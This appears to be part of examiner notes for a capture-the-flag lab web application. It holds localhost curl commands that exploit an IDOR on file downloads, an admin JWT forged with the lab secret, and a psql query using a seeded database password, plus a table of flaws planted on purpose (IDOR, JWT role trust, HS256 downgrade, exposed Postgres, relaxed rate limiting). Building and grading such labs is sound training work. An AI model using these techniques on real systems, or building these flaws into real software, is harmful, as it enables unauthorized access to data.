## 2. Proof commands (examiner)

### User

```bash
curl -sS -X POST http://127.0.0.1:8080/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"lisa@kc.test","password":"lisa123"}'
# identity
curl -sS -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8080/api/auth/me
# flag
curl -sS -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8080/api/files/9104/download
```

### Admin (forge with lab JWT_SECRET)

```bash
# jwt_tool or node jsonwebtoken — role:admin, sub = lisa userId
curl -sS -H "Authorization: Bearer $ADMIN_TOKEN" http://127.0.0.1:8080/api/files/9105/download
```

### DB

```bash
PGPASSWORD='KcCtfDbPr0of2026!' psql -h 127.0.0.1 -p 5433 -U postgres -d kc_prod \
  -c 'SELECT current_user;' \
  -c "SELECT value FROM ctf_flag WHERE name='proof';"
```

Automated: `./infra/ctf-examiner.sh`

## 3. Diff from v2.0.0

| Area | v2.0.0 | v1.1.0 CTF |
|------|--------|------------|
| File read/download | Ownership enforced | IDOR when `CTF_MODE` |
| HasRoleGuard | DB role | JWT role when `CTF_MODE` |
| JWT | RS256 prod | HS256 when `CTF_MODE` |
| Postgres publish | No (prod) | `:5433` on CTF overlay |
| Seeds | Demo secrets text | + local/proof flags, lisa, `ctf_flag` |
| Auth rate limit | Strict | Relaxed on CTF |
